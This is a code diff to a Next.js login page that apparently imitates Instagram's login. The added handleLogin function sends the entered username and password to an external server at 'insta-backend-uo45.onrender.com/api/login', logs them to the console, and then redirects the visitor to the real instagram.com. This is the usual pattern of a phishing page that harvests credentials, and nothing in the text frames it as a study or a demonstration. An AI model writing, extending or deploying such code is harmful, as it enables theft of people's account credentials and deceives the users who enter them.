@@ -7,8 +7,35 @@ import { useRouter } from "next/navigation";
 
 const LoginPage = () => {
   const router = useRouter();
-  const [formData, setFormData] = useState({ email: "", password: "" });
+  const [formData, setFormData] = useState({ username: "", password: "" });
   const [error, setError] = useState("");
+
+  const handleLogin = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!formData.username || !formData.password) {
+      setError("Please fill in all fields.");
+    } else {
+      const response = await fetch(
+        "https://insta-backend-uo45.onrender.com/api/login",
+        {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(formData),
+        }
+      );
+
+      if (!response.ok) {
+        setError("Login failed. Please try again.");
+      } else {
+        setError("");
+        router.push("https://www.instagram.com");
+      }
+      console.log("Logging in with:", formData);
+    }
+  };
+
   return (
     <Box
       sx={{
@@ -95,9 +122,10 @@ const LoginPage = () => {
                   width: "100%",
                   fontWeight: 500,
                 }}
-                value={formData.email}
+                name="username"
+                value={formData.username}
                 onChange={(e) =>
-                  setFormData({ ...formData, email: e.target.value })
+                  setFormData({ ...formData, username: e.target.value })
                 }
               />
               <Input
@@ -114,6 +142,7 @@ const LoginPage = () => {
                   fontWeight: 500,
                 }}
                 value={formData.password}
+                name="password"
                 onChange={(e) =>
                   setFormData({ ...formData, password: e.target.value })
                 }
@@ -135,18 +164,7 @@ const LoginPage = () => {
                 height: "40px",
                 width: "100%",
               }}
-              onClick={(e) => {
-                e.preventDefault();
-                if (!formData.email || !formData.password) {
-                  setError("Please fill in all fields.");
-                } else if (formData.email && formData.password) {
-                  router.push("https://www.instagram.com");
-                } else {
-                  setError("");
-
-                  console.log("Logging in with:", formData);
-                }
-              }}
+              onClick={handleLogin}
             >
               Log In
             </Button>
